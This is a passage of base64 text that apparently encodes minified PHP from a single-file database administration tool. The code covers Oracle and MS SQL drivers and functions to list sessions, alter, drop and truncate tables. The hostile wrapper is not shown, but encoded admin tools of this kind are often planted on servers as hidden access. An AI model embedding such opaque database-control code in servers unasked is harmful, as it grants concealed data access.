lYWx8bW9uZXkiPT4iKy8tIiwiZGF0ZXx0aW1lIj0+IisgaW50ZXJ2YWwvLSBpbnRlcnZhbCIsImNoYXJ8dGV4dCI9PiJ8fCIsKSk7fSRWYlsib3JhY2xlIl09Ik9yYWNsZSI7aWYoaXNzZXQoJF9HRVRbIm9yYWNsZSJdKSl7JHdmPWFycmF5KCJPQ0k4IiwiUERPX09DSSIpO2RlZmluZSgiRFJJVkVSIiwib3JhY2xlIik7aWYoZXh0ZW5zaW9uX2xvYWRlZCgib2NpOCIpKXtjbGFzcw0KTWluX0RCe3ZhciRleHRlbnNpb249Im9jaTgiLCRfbGluaywkX3Jlc3VsdCwkc2VydmVyX2luZm8sJGFmZmVjdGVkX3Jvd3MsJGVycm5vLCRlcnJvcjtmdW5jdGlvbg0KX2Vycm9yKCRvYywkbil7aWYoaW5pX2Jvb2woImh0bWxfZXJyb3JzIikpJG49aHRtbF9lbnRpdHlfZGVjb2RlKHN0cmlwX3RhZ3MoJG4pKTskbj1wcmVnX3JlcGxhY2UoJ35eW146XSo6IH4nLCcnLCRuKTskdGhpcy0+ZXJyb3I9JG47fWZ1bmN0aW9uDQpjb25uZWN0KCROLCRWLCRHKXskdGhpcy0+X2xpbms9QG9jaV9uZXdfY29ubmVjdCgkViwkRywkTiwiQUwzMlVURjgiKTtpZigkdGhpcy0+X2xpbmspeyR0aGlzLT5zZXJ2ZXJfaW5mbz1vY2lfc2VydmVyX3ZlcnNpb24oJHRoaXMtPl9saW5rKTtyZXR1cm4NCnRydWU7fSRuPW9jaV9lcnJvcigpOyR0aGlzLT5lcnJvcj0kblsibWVzc2FnZSJdO3JldHVybg0KZmFsc2U7fWZ1bmN0aW9uDQpxdW90ZSgkUCl7cmV0dXJuIiciLnN0cl9yZXBsYWNlKCInIiwiJyciLCRQKS4iJyI7fWZ1bmN0aW9uDQpzZWxlY3RfZGIoJGspe3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCnF1ZXJ5KCRILCRfaD1mYWxzZSl7JEk9b2NpX3BhcnNlKCR0aGlzLT5fbGluaywkSCk7JHRoaXMtPmVycm9yPSIiO2lmKCEkSSl7JG49b2NpX2Vycm9yKCR0aGlzLT5fbGluayk7JHRoaXMtPmVycm5vPSRuWyJjb2RlIl07JHRoaXMtPmVycm9yPSRuWyJtZXNzYWdlIl07cmV0dXJuDQpmYWxzZTt9c2V0X2Vycm9yX2hhbmRsZXIoYXJyYXkoJHRoaXMsJ19lcnJvcicpKTskSj1Ab2NpX2V4ZWN1dGUoJEkpO3Jlc3RvcmVfZXJyb3JfaGFuZGxlcigpO2lmKCRKKXtpZihvY2lfbnVtX2ZpZWxkcygkSSkpcmV0dXJuDQpuZXcNCk1pbl9SZXN1bHQoJEkpOyR0aGlzLT5hZmZlY3RlZF9yb3dzPW9jaV9udW1fcm93cygkSSk7fXJldHVybiRKO31mdW5jdGlvbg0KbXVsdGlfcXVlcnkoJEgpe3JldHVybiR0aGlzLT5fcmVzdWx0PSR0aGlzLT5xdWVyeSgkSCk7fWZ1bmN0aW9uDQpzdG9yZV9yZXN1bHQoKXtyZXR1cm4kdGhpcy0+X3Jlc3VsdDt9ZnVuY3Rpb24NCm5leHRfcmVzdWx0KCl7cmV0dXJuDQpmYWxzZTt9ZnVuY3Rpb24NCnJlc3VsdCgkSCwkbz0xKXskST0kdGhpcy0+cXVlcnkoJEgpO2lmKCFpc19vYmplY3QoJEkpfHwhb2NpX2ZldGNoKCRJLT5fcmVzdWx0KSlyZXR1cm4NCmZhbHNlO3JldHVybg0Kb2NpX3Jlc3VsdCgkSS0+X3Jlc3VsdCwkbyk7fX1jbGFzcw0KTWluX1Jlc3VsdHt2YXIkX3Jlc3VsdCwkX29mZnNldD0xLCRudW1fcm93cztmdW5jdGlvbg0KX19jb25zdHJ1Y3QoJEkpeyR0aGlzLT5fcmVzdWx0PSRJO31mdW5jdGlvbg0KX2NvbnZlcnQoJEspe2ZvcmVhY2goKGFycmF5KSRLDQphcyR4PT4kWCl7aWYoaXNfYSgkWCwnT0NJLUxvYicpKSRLWyR4XT0kWC0+bG9hZCgpO31yZXR1cm4kSzt9ZnVuY3Rpb24NCmZldGNoX2Fzc29jKCl7cmV0dXJuJHRoaXMtPl9jb252ZXJ0KG9jaV9mZXRjaF9hc3NvYygkdGhpcy0+X3Jlc3VsdCkpO31mdW5jdGlvbg0KZmV0Y2hfcm93KCl7cmV0dXJuJHRoaXMtPl9jb252ZXJ0KG9jaV9mZXRjaF9yb3coJHRoaXMtPl9yZXN1bHQpKTt9ZnVuY3Rpb24NCmZldGNoX2ZpZWxkKCl7JGU9JHRoaXMtPl9vZmZzZXQrKzskSj1uZXcNCnN0ZENsYXNzOyRKLT5uYW1lPW9jaV9maWVsZF9uYW1lKCR0aGlzLT5fcmVzdWx0LCRlKTskSi0+b3JnbmFtZT0kSi0+bmFtZTskSi0+dHlwZT1vY2lfZmllbGRfdHlwZSgkdGhpcy0+X3Jlc3VsdCwkZSk7JEotPmNoYXJzZXRucj0ocHJlZ19tYXRjaCgifnJhd3xibG9ifGJmaWxlfiIsJEotPnR5cGUpPzYzOjApO3JldHVybiRKO31mdW5jdGlvbg0KX19kZXN0cnVjdCgpe29jaV9mcmVlX3N0YXRlbWVudCgkdGhpcy0+X3Jlc3VsdCk7fX19ZWxzZWlmKGV4dGVuc2lvbl9sb2FkZWQoInBkb19vY2kiKSl7Y2xhc3MNCk1pbl9EQg0KZXh0ZW5kcw0KTWluX1BET3t2YXIkZXh0ZW5zaW9uPSJQRE9fT0NJIjtmdW5jdGlvbg0KY29ubmVjdCgkTiwkViwkRyl7JHRoaXMtPmRzbigib2NpOmRibmFtZT0vLyROO2NoYXJzZXQ9QUwzMlVURjgiLCRWLCRHKTtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpzZWxlY3RfZGIoJGspe3JldHVybg0KdHJ1ZTt9fX1jbGFzcw0KTWluX0RyaXZlcg0KZXh0ZW5kcw0KTWluX1NRTHtmdW5jdGlvbg0KYmVnaW4oKXtyZXR1cm4NCnRydWU7fX1mdW5jdGlvbg0KaWRmX2VzY2FwZSgkdCl7cmV0dXJuJyInLnN0cl9yZXBsYWNlKCciJywnIiInLCR0KS4nIic7fWZ1bmN0aW9uDQp0YWJsZSgkdCl7cmV0dXJuDQppZGZfZXNjYXBlKCR0KTt9ZnVuY3Rpb24NCmNvbm5lY3QoKXtnbG9iYWwkYjskZz1uZXcNCk1pbl9EQjskaj0kYi0+Y3JlZGVudGlhbHMoKTtpZigkZy0+Y29ubmVjdCgkalswXSwkalsxXSwkalsyXSkpcmV0dXJuJGc7cmV0dXJuJGctPmVycm9yO31mdW5jdGlvbg0KZ2V0X2RhdGFiYXNlcygpe3JldHVybg0KZ2V0X3ZhbHMoIlNFTEVDVCB0YWJsZXNwYWNlX25hbWUgRlJPTSB1c2VyX3RhYmxlc3BhY2VzIik7fWZ1bmN0aW9uDQpsaW1pdCgkSCwkWiwkeiwkRD0wLCRyZz0iICIpe3JldHVybigkRD8iICogRlJPTSAoU0VMRUNUIHQuKiwgcm93bnVtIEFTIHJudW0gRlJPTSAoU0VMRUNUICRIJFopIHQgV0hFUkUgcm93bnVtIDw9ICIuKCR6KyREKS4iKSBXSEVSRSBybnVtID4gJEQiOigkeiE9PW51bGw/IiAqIEZST00gKFNFTEVDVCAkSCRaKSBXSEVSRSByb3dudW0gPD0gIi4oJHorJEQpOiIgJEgkWiIpKTt9ZnVuY3Rpb24NCmxpbWl0MSgkSCwkWil7cmV0dXJuIiAkSCRaIjt9ZnVuY3Rpb24NCmRiX2NvbGxhdGlvbigkbSwkbWIpe2dsb2JhbCRnO3JldHVybiRnLT5yZXN1bHQoIlNFTEVDVCB2YWx1ZSBGUk9NIG5sc19kYXRhYmFzZV9wYXJhbWV0ZXJzIFdIRVJFIHBhcmFtZXRlciA9ICdOTFNfQ0hBUkFDVEVSU0VUJyIpO31mdW5jdGlvbg0KZW5naW5lcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCmxvZ2dlZF91c2VyKCl7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIFVTRVIgRlJPTSBEVUFMIik7fWZ1bmN0aW9uDQp0YWJsZXNfbGlzdCgpe3JldHVybg0KZ2V0X2tleV92YWxzKCJTRUxFQ1QgdGFibGVfbmFtZSwgJ3RhYmxlJyBGUk9NIGFsbF90YWJsZXMgV0hFUkUgdGFibGVzcGFjZV9uYW1lID0gIi5xKERCKS4iDQpVTklPTiBTRUxFQ1Qgdmlld19uYW1lLCAndmlldycgRlJPTSB1c2VyX3ZpZXdzDQpPUkRFUiBCWSAxIik7fWZ1bmN0aW9uDQpjb3VudF90YWJsZXMoJGwpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCnRhYmxlX3N0YXR1cygkQz0iIil7JEo9YXJyYXkoKTskbWc9cSgkQyk7Zm9yZWFjaChnZXRfcm93cygnU0VMRUNUIHRhYmxlX25hbWUgIk5hbWUiLCBcJ3RhYmxlXCcgIkVuZ2luZSIsIGF2Z19yb3dfbGVuICogbnVtX3Jvd3MgIkRhdGFfbGVuZ3RoIiwgbnVtX3Jvd3MgIlJvd3MiIEZST00gYWxsX3RhYmxlcyBXSEVSRSB0YWJsZXNwYWNlX25hbWUgPSAnLnEoREIpLigkQyE9IiI/IiBBTkQgdGFibGVfbmFtZSA9ICRtZyI6IiIpLiINClVOSU9OIFNFTEVDVCB2aWV3X25hbWUsICd2aWV3JywgMCwgMCBGUk9NIHVzZXJfdmlld3MiLigkQyE9IiI/IiBXSEVSRSB2aWV3X25hbWUgPSAkbWciOiIiKS4iDQpPUkRFUiBCWSAxIilhcyRLKXtpZigkQyE9IiIpcmV0dXJuJEs7JEpbJEtbIk5hbWUiXV09JEs7fXJldHVybiRKO31mdW5jdGlvbg0KaXNfdmlldygkUil7cmV0dXJuJFJbIkVuZ2luZSJdPT0idmlldyI7fWZ1bmN0aW9uDQpma19zdXBwb3J0KCRSKXtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpmaWVsZHMoJFEpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUICogRlJPTSBhbGxfdGFiX2NvbHVtbnMgV0hFUkUgdGFibGVfbmFtZSA9ICIucSgkUSkuIiBPUkRFUiBCWSBjb2x1bW5faWQiKWFzJEspeyRVPSRLWyJEQVRBX1RZUEUiXTskeT0iJEtbREFUQV9QUkVDSVNJT05dLCRLW0RBVEFfU0NBTEVdIjtpZigkeT09IiwiKSR5PSRLWyJEQVRBX0xFTkdUSCJdOyRKWyRLWyJDT0xVTU5fTkFNRSJdXT1hcnJheSgiZmllbGQiPT4kS1siQ09MVU1OX05BTUUiXSwiZnVsbF90eXBlIj0+JFUuKCR5PyIoJHkpIjoiIiksInR5cGUiPT5zdHJ0b2xvd2VyKCRVKSwibGVuZ3RoIj0+JHksImRlZmF1bHQiPT4kS1siREFUQV9ERUZBVUxUIl0sIm51bGwiPT4oJEtbIk5VTExBQkxFIl09PSJZIiksInByaXZpbGVnZXMiPT5hcnJheSgiaW5zZXJ0Ij0+MSwic2VsZWN0Ij0+MSwidXBkYXRlIj0+MSksKTt9cmV0dXJuJEo7fWZ1bmN0aW9uDQppbmRleGVzKCRRLCRoPW51bGwpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUIHVpYy4qLCB1Yy5jb25zdHJhaW50X3R5cGUNCkZST00gdXNlcl9pbmRfY29sdW1ucyB1aWMNCkxFRlQgSk9JTiB1c2VyX2NvbnN0cmFpbnRzIHVjIE9OIHVpYy5pbmRleF9uYW1lID0gdWMuY29uc3RyYWludF9uYW1lIEFORCB1aWMudGFibGVfbmFtZSA9IHVjLnRhYmxlX25hbWUNCldIRVJFIHVpYy50YWJsZV9uYW1lID0gIi5xKCRRKS4iDQpPUkRFUiBCWSB1Yy5jb25zdHJhaW50X3R5cGUsIHVpYy5jb2x1bW5fcG9zaXRpb24iLCRoKWFzJEspeyRtZD0kS1siSU5ERVhfTkFNRSJdOyRKWyRtZF1bInR5cGUiXT0oJEtbIkNPTlNUUkFJTlRfVFlQRSJdPT0iUCI/IlBSSU1BUlkiOigkS1siQ09OU1RSQUlOVF9UWVBFIl09PSJVIj8iVU5JUVVFIjoiSU5ERVgiKSk7JEpbJG1kXVsiY29sdW1ucyJdW109JEtbIkNPTFVNTl9OQU1FIl07JEpbJG1kXVsibGVuZ3RocyJdW109KCRLWyJDSEFSX0xFTkdUSCJdJiYkS1siQ0hBUl9MRU5HVEgiXSE9JEtbIkNPTFVNTl9MRU5HVEgiXT8kS1siQ0hBUl9MRU5HVEgiXTpudWxsKTskSlskbWRdWyJkZXNjcyJdW109KCRLWyJERVNDRU5EIl0/JzEnOm51bGwpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCnZpZXcoJEMpeyRMPWdldF9yb3dzKCdTRUxFQ1QgdGV4dCAic2VsZWN0IiBGUk9NIHVzZXJfdmlld3MgV0hFUkUgdmlld19uYW1lID0gJy5xKCRDKSk7cmV0dXJuDQpyZXNldCgkTCk7fWZ1bmN0aW9uDQpjb2xsYXRpb25zKCl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0KaW5mb3JtYXRpb25fc2NoZW1hKCRtKXtyZXR1cm4NCmZhbHNlO31mdW5jdGlvbg0KZXJyb3IoKXtnbG9iYWwkZztyZXR1cm4NCmgoJGctPmVycm9yKTt9ZnVuY3Rpb24NCmV4cGxhaW4oJGcsJEgpeyRnLT5xdWVyeSgiRVhQTEFJTiBQTEFOIEZPUiAkSCIpO3JldHVybiRnLT5xdWVyeSgiU0VMRUNUICogRlJPTSBwbGFuX3RhYmxlIik7fWZ1bmN0aW9uDQpmb3VuZF9yb3dzKCRSLCRaKXt9ZnVuY3Rpb24NCmFsdGVyX3RhYmxlKCRRLCRDLCRwLCRLYywkcWIsJGxjLCRkLCRLYSwka2YpeyRjPSRXYj1hcnJheSgpO2ZvcmVhY2goJHANCmFzJG8peyRYPSRvWzFdO2lmKCRYJiYkb1swXSE9IiImJmlkZl9lc2NhcGUoJG9bMF0pIT0kWFswXSlxdWVyaWVzKCJBTFRFUiBUQUJMRSAiLnRhYmxlKCRRKS4iIFJFTkFNRSBDT0xVTU4gIi5pZGZfZXNjYXBlKCRvWzBdKS4iIFRPICRYWzBdIik7aWYoJFgpJGNbXT0oJFEhPSIiPygkb1swXSE9IiI/Ik1PRElGWSAoIjoiQUREICgiKToiICAiKS5pbXBsb2RlKCRYKS4oJFEhPSIiPyIpIjoiIik7ZWxzZSRXYltdPWlkZl9lc2NhcGUoJG9bMF0pO31pZigkUT09IiIpcmV0dXJuDQpxdWVyaWVzKCJDUkVBVEUgVEFCTEUgIi50YWJsZSgkQykuIiAoXG4iLmltcGxvZGUoIixcbiIsJGMpLiJcbikiKTtyZXR1cm4oISRjfHxxdWVyaWVzKCJBTFRFUiBUQUJMRSAiLnRhYmxlKCRRKS4iXG4iLmltcGxvZGUoIlxuIiwkYykpKSYmKCEkV2J8fHF1ZXJpZXMoIkFMVEVSIFRBQkxFICIudGFibGUoJFEpLiIgRFJPUCAoIi5pbXBsb2RlKCIsICIsJFdiKS4iKSIpKSYmKCRRPT0kQ3x8cXVlcmllcygiQUxURVIgVEFCTEUgIi50YWJsZSgkUSkuIiBSRU5BTUUgVE8gIi50YWJsZSgkQykpKTt9ZnVuY3Rpb24NCmZvcmVpZ25fa2V5cygkUSl7JEo9YXJyYXkoKTskSD0iU0VMRUNUIGNfbGlzdC5DT05TVFJBSU5UX05BTUUgYXMgTkFNRSwNCmNfc3JjLkNPTFVNTl9OQU1FIGFzIFNSQ19DT0xVTU4sDQpjX2Rlc3QuT1dORVIgYXMgREVTVF9EQiwNCmNfZGVzdC5UQUJMRV9OQU1FIGFzIERFU1RfVEFCTEUsDQpjX2Rlc3QuQ09MVU1OX05BTUUgYXMgREVTVF9DT0xVTU4sDQpjX2xpc3QuREVMRVRFX1JVTEUgYXMgT05fREVMRVRFDQpGUk9NIEFMTF9DT05TVFJBSU5UUyBjX2xpc3QsIEFMTF9DT05TX0NPTFVNTlMgY19zcmMsIEFMTF9DT05TX0NPTFVNTlMgY19kZXN0DQpXSEVSRSBjX2xpc3QuQ09OU1RSQUlOVF9OQU1FID0gY19zcmMuQ09OU1RSQUlOVF9OQU1FDQpBTkQgY19saXN0LlJfQ09OU1RSQUlOVF9OQU1FID0gY19kZXN0LkNPTlNUUkFJTlRfTkFNRQ0KQU5EIGNfbGlzdC5DT05TVFJBSU5UX1RZUEUgPSAnUicNCkFORCBjX3NyYy5UQUJMRV9OQU1FID0gIi5xKCRRKTtmb3JlYWNoKGdldF9yb3dzKCRIKWFzJEspJEpbJEtbJ05BTUUnXV09YXJyYXkoImRiIj0+JEtbJ0RFU1RfREInXSwidGFibGUiPT4kS1snREVTVF9UQUJMRSddLCJzb3VyY2UiPT5hcnJheSgkS1snU1JDX0NPTFVNTiddKSwidGFyZ2V0Ij0+YXJyYXkoJEtbJ0RFU1RfQ09MVU1OJ10pLCJvbl9kZWxldGUiPT4kS1snT05fREVMRVRFJ10sIm9uX3VwZGF0ZSI9Pm51bGwsKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCnRydW5jYXRlX3RhYmxlcygkUyl7cmV0dXJuDQphcHBseV9xdWVyaWVzKCJUUlVOQ0FURSBUQUJMRSIsJFMpO31mdW5jdGlvbg0KZHJvcF92aWV3cygkVmgpe3JldHVybg0KYXBwbHlfcXVlcmllcygiRFJPUCBWSUVXIiwkVmgpO31mdW5jdGlvbg0KZHJvcF90YWJsZXMoJFMpe3JldHVybg0KYXBwbHlfcXVlcmllcygiRFJPUCBUQUJMRSIsJFMpO31mdW5jdGlvbg0KbGFzdF9pZCgpe3JldHVybg0KMDt9ZnVuY3Rpb24NCnNjaGVtYXMoKXtyZXR1cm4NCmdldF92YWxzKCJTRUxFQ1QgRElTVElOQ1Qgb3duZXIgRlJPTSBkYmFfc2VnbWVudHMgV0hFUkUgb3duZXIgSU4gKFNFTEVDVCB1c2VybmFtZSBGUk9NIGRiYV91c2VycyBXSEVSRSBkZWZhdWx0X3RhYmxlc3BhY2UgTk9UIElOICgnU1lTVEVNJywnU1lTQVVYJykpIik7fWZ1bmN0aW9uDQpnZXRfc2NoZW1hKCl7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIHN5c19jb250ZXh0KCdVU0VSRU5WJywgJ1NFU1NJT05fVVNFUicpIEZST00gZHVhbCIpO31mdW5jdGlvbg0Kc2V0X3NjaGVtYSgkbGcpe2dsb2JhbCRnO3JldHVybiRnLT5xdWVyeSgiQUxURVIgU0VTU0lPTiBTRVQgQ1VSUkVOVF9TQ0hFTUEgPSAiLmlkZl9lc2NhcGUoJGxnKSk7fWZ1bmN0aW9uDQpzaG93X3ZhcmlhYmxlcygpe3JldHVybg0KZ2V0X2tleV92YWxzKCdTRUxFQ1QgbmFtZSwgZGlzcGxheV92YWx1ZSBGUk9NIHYkcGFyYW1ldGVyJyk7fWZ1bmN0aW9uDQpwcm9jZXNzX2xpc3QoKXtyZXR1cm4NCmdldF9yb3dzKCdTRUxFQ1Qgc2Vzcy5wcm9jZXNzIEFTICJwcm9jZXNzIiwgc2Vzcy51c2VybmFtZSBBUyAidXNlciIsIHNlc3Muc2NoZW1hbmFtZSBBUyAic2NoZW1hIiwgc2Vzcy5zdGF0dXMgQVMgInN0YXR1cyIsIHNlc3Mud2FpdF9jbGFzcyBBUyAid2FpdF9jbGFzcyIsIHNlc3Muc2Vjb25kc19pbl93YWl0IEFTICJzZWNvbmRzX2luX3dhaXQiLCBzcWwuc3FsX3RleHQgQVMgInNxbF90ZXh0Iiwgc2Vzcy5tYWNoaW5lIEFTICJtYWNoaW5lIiwgc2Vzcy5wb3J0IEFTICJwb3J0Ig0KRlJPTSB2JHNlc3Npb24gc2VzcyBMRUZUIE9VVEVSIEpPSU4gdiRzcWwgc3FsDQpPTiBzcWwuc3FsX2lkID0gc2Vzcy5zcWxfaWQNCldIRVJFIHNlc3MudHlwZSA9IFwnVVNFUlwnDQpPUkRFUiBCWSBQUk9DRVNTDQonKTt9ZnVuY3Rpb24NCnNob3dfc3RhdHVzKCl7JEw9Z2V0X3Jvd3MoJ1NFTEVDVCAqIEZST00gdiRpbnN0YW5jZScpO3JldHVybg0KcmVzZXQoJEwpO31mdW5jdGlvbg0KY29udmVydF9maWVsZCgkbyl7fWZ1bmN0aW9uDQp1bmNvbnZlcnRfZmllbGQoJG8sJEope3JldHVybiRKO31mdW5jdGlvbg0Kc3VwcG9ydCgkRGMpe3JldHVybg0KcHJlZ19tYXRjaCgnfl4oY29sdW1uc3xkYXRhYmFzZXxkcm9wX2NvbHxpbmRleGVzfHByb2Nlc3NsaXN0fHNjaGVtZXxzcWx8c3RhdHVzfHRhYmxlfHZhcmlhYmxlc3x2aWV3fHZpZXdfdHJpZ2dlcikkficsJERjKTt9JHc9Im9yYWNsZSI7JHpoPWFycmF5KCk7JElnPWFycmF5KCk7Zm9yZWFjaChhcnJheSgnTnVtYmVycyc9PmFycmF5KCJudW1iZXIiPT4zOCwiYmluYXJ5X2Zsb2F0Ij0+MTIsImJpbmFyeV9kb3VibGUiPT4yMSksJ0RhdGUgYW5kIHRpbWUnPT5hcnJheSgiZGF0ZSI9PjEwLCJ0aW1lc3RhbXAiPT4yOSwiaW50ZXJ2YWwgeWVhciI9PjEyLCJpbnRlcnZhbCBkYXkiPT4yOCksJ1N0cmluZ3MnPT5hcnJheSgiY2hhciI9PjIwMDAsInZhcmNoYXIyIj0+NDAwMCwibmNoYXIiPT4yMDAwLCJudmFyY2hhcjIiPT40MDAwLCJjbG9iIj0+NDI5NDk2NzI5NSwibmNsb2IiPT40Mjk0OTY3Mjk1KSwnQmluYXJ5Jz0+YXJyYXkoInJhdyI9PjIwMDAsImxvbmcgcmF3Ij0+MjE0NzQ4MzY0OCwiYmxvYiI9PjQyOTQ5NjcyOTUsImJmaWxlIj0+NDI5NDk2NzI5NiksKWFzJHg9PiRYKXskemgrPSRYOyRJZ1skeF09YXJyYXlfa2V5cygkWCk7fSRGaD1hcnJheSgpOyRPZT1hcnJheSgiPSIsIjwiLCI+IiwiPD0iLCI+PSIsIiE9IiwiTElLRSIsIkxJS0UgJSUiLCJJTiIsIklTIE5VTEwiLCJOT1QgTElLRSIsIk5PVCBSRUdFWFAiLCJOT1QgSU4iLCJJUyBOT1QgTlVMTCIsIlNRTCIpOyRTYz1hcnJheSgibGVuZ3RoIiwibG93ZXIiLCJyb3VuZCIsInVwcGVyIik7JFhjPWFycmF5KCJhdmciLCJjb3VudCIsImNvdW50IGRpc3RpbmN0IiwibWF4IiwibWluIiwic3VtIik7JGRjPWFycmF5KGFycmF5KCJkYXRlIj0+ImN1cnJlbnRfZGF0ZSIsInRpbWVzdGFtcCI9PiJjdXJyZW50X3RpbWVzdGFtcCIsKSxhcnJheSgibnVtYmVyfGZsb2F0fGRvdWJsZSI9PiIrLy0iLCJkYXRlfHRpbWVzdGFtcCI9PiIrIGludGVydmFsLy0gaW50ZXJ2YWwiLCJjaGFyfGNsb2IiPT4ifHwiLCkpO30kVmJbIm1zc3FsIl09Ik1TIFNRTCI7aWYoaXNzZXQoJF9HRVRbIm1zc3FsIl0pKXskd2Y9YXJyYXkoIlNRTFNSViIsIk1TU1FMIik7ZGVmaW5lKCJEUklWRVIiLCJtc3NxbCIpO2lmKGV4dGVuc2lvbl9sb2FkZWQoInNxbHNydiIpKXtjbGFzcw0KTWluX0RCe3ZhciRleHRlbnNpb249InNxbHNydiIsJF9saW5rLCRfcmVzdWx0LCRzZXJ2ZXJfaW5mbywkYWZmZWN0ZWRfcm93cywkZXJybm8sJGVycm9yO2Z1bmN0aW9uDQpfZ2V0X2Vycm9yKCl7JHRoaXMtPmVycm9yPSIiO2ZvcmVhY2goc3Fsc3J2X2Vycm9ycygpYXMkbil7JHRoaXMtPmVycm5vPSRuWyJjb2RlIl07JHRoaXMtPmVycm9yLj0iJG5bbWVzc2FnZV1cbiI7fSR0aGlzLT5lcnJvcj1ydHJpbSgkdGhpcy0+ZXJyb3IpO31mdW5jdGlvbg0KY29ubmVjdCgkTiwkViwkRyl7JHRoaXMtPl9saW5rPUBzcWxzcnZfY29ubmVjdCgkTixhcnJheSgiVUlEIj0+JFYsIlBXRCI9PiRHLCJDaGFyYWN0ZXJTZXQiPT4iVVRGLTgiKSk7aWYoJHRoaXMtPl9saW5rKXskcWQ9c3Fsc3J2X3NlcnZlcl9pbmZvKCR0aGlzLT5fbGluayk7JHRoaXMtPnNlcnZlcl9pbmZvPSRxZFsnU1FMU2VydmVyVmVyc2lvbiddO31lbHNlJHRoaXMtPl9nZXRfZXJyb3IoKTtyZXR1cm4oYm9vbCkkdGhpcy0+X2xpbms7fWZ1bmN0aW9uDQpxdW90ZSgkUCl7cmV0dXJuIiciLnN0cl9yZXBsYWNlKCInIiwiJyciLCRQKS4iJyI7fWZ1bmN0aW9uDQpzZWxlY3RfZGIoJGspe3JldHVybiR0aGlzLT5xdWVyeSgiVVNFICIuaWRmX2VzY2FwZSgkaykpO31mdW5jdGlvbg0KcXVlcnkoJEgsJF9oPWZhbHNlKXskST1zcWxzcnZfcXVlcnkoJHRoaXMtPl9saW5rLCRIKTskdGhpcy0+ZXJyb3I9IiI7aWYoISRJKXskdGhpcy0+X2dldF9lcnJvcigpO3JldHVybg0KZmFsc2U7fXJldHVybiR0aGlzLT5zdG9yZV9yZXN1bHQoJEkpO31mdW5jdGlvbg0KbXVsdGlfcXVlcnkoJEgpeyR0aGlzLT5fcmVzdWx0PXNxbHNydl9xdWVyeSgkdGhpcy0+X2xpbmssJEgpOyR0aGlzLT5lcnJvcj0iIjtpZighJHRoaXMtPl9yZXN1bHQpeyR0aGlzLT5fZ2V0X2Vycm9yKCk7cmV0dXJuDQpmYWxzZTt9cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0Kc3RvcmVfcmVzdWx0KCRJPW51bGwpe2lmKCEkSSkkST0kdGhpcy0+X3Jlc3VsdDtpZighJEkpcmV0dXJuDQpmYWxzZTtpZihzcWxzcnZfZmllbGRfbWV0YWRhdGEoJEkpKXJldHVybg0KbmV3DQpNaW5fUmVzdWx0KCRJKTskdGhpcy0+YWZmZWN0ZWRfcm93cz1zcWxzcnZfcm93c19hZmZlY3RlZCgkSSk7cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0KbmV4dF9yZXN1bHQoKXtyZXR1cm4kdGhpcy0+X3Jlc3VsdD9zcWxzcnZfbmV4dF9yZXN1bHQoJHRoaXMtPl9yZXN1bHQpOm51bGw7fWZ1bmN0aW9uDQpyZXN1bHQoJEgsJG89MCl7JEk9JHRoaXMtPnF1ZXJ5KCRIKTtpZighaXNfb2JqZWN0KCRJKSlyZXR1cm4NCmZhbHNlOyRLPSRJLT5mZXRjaF9yb3coKTtyZXR1cm4kS1skb107fX1jbGFzcw0KTWluX1Jlc3VsdHt2YXIkX3Jlc3VsdCwkX29mZnNldD0wLCRfZmllbGRzLCRudW1fcm93cztmdW5jdGlvbg0KX19jb25zdHJ1Y3QoJEkpeyR0aGlzLT5fcmVzdWx0PSRJO31mdW5jdGlvbg0KX2NvbnZlcnQoJEspe2ZvcmVhY2goKGFycmF5KSRLDQphcyR4PT4kWCl7aWYoaXNfYSgkWCwnRGF0ZVRpbWUnKSkkS1skeF09JFgtPmZvcm1hdCgiWS1tLWQgSDppOnMiKTt9cmV0dXJuJEs7fWZ1bmN0aW9uDQpmZXRjaF9hc3NvYygpe3JldHVybiR0aGlzLT5fY29udmVydChzcWxzcnZfZmV0Y2hfYXJyYXkoJHRoaXMtPl9yZXN1bHQsU1FMU1JWX0ZFVENIX0FTU09DLFNRTFNSVl9TQ1JPTExfTkVYVCkpO31mdW5jdGlvbg0KZmV0Y2hfcm93KCl7cmV0dXJuJHRoaXMtPl9jb252ZXJ0KHNxbHNydl9mZXRjaF9hcnJheSgkdGhpcy0+X3Jlc3VsdCxTUUxTUlZfRkVUQ0hfTlVNRVJJQyxTUUxTUlZfU0NST0xMX05FWFQpKTt9ZnVuY3Rpb24NCmZldGNoX2ZpZWxkKCl7aWYoISR0aGlzLT5fZmllbGRzKSR0aGlzLT5fZmllbGRzPXNxbHNydl9maWVsZF9tZXRhZGF0YSgkdGhpcy0+X3Jlc3VsdCk7JG89JHRoaXMtPl9maWVsZHNbJHRoaXMtPl9vZmZzZXQrK107JEo9bmV3DQpzdGRDbGFzczskSi0+bmFtZT0kb1siTmFtZSJdOyRKLT5vcmduYW1lPSRvWyJOYW1lIl07JEotPnR5cGU9KCRvWyJUeXBlIl09PTE/MjU0OjApO3JldHVybiRKO31mdW5jdGlvbg0Kc2VlaygkRCl7Zm9yKCRzPTA7JHM8JEQ7JHMrKylzcWxzcnZfZmV0Y2goJHRoaXMtPl9yZXN1bHQpO31mdW5jdGlvbg0KX19kZXN0cnVjdCgpe3NxbHNydl9mcmVlX3N0bXQoJHRoaXMtPl9yZXN1bHQpO319fWVsc2VpZihleHRlbnNpb25fbG9hZGVkKCJtc3NxbCIpKXtjbGFzcw0KTWluX0RCe3ZhciRleHRlbnNpb249Ik1TU1FMIiwkX2xpbmssJF9yZXN1bHQsJHNlcnZlcl9pbmZvLCRhZmZlY3RlZF9yb3dzLCRlcnJvcjtmdW5jdGlvbg0KY29ubmVjdCgkTiwkViwkRyl7JHRoaXMtPl9saW5rPUBtc3NxbF9jb25uZWN0KCROLCRWLCRHKTtpZigkdGhpcy0+X2xpbmspeyRJPSR0aGlzLT5xdWVyeSgiU0VMRUNUIF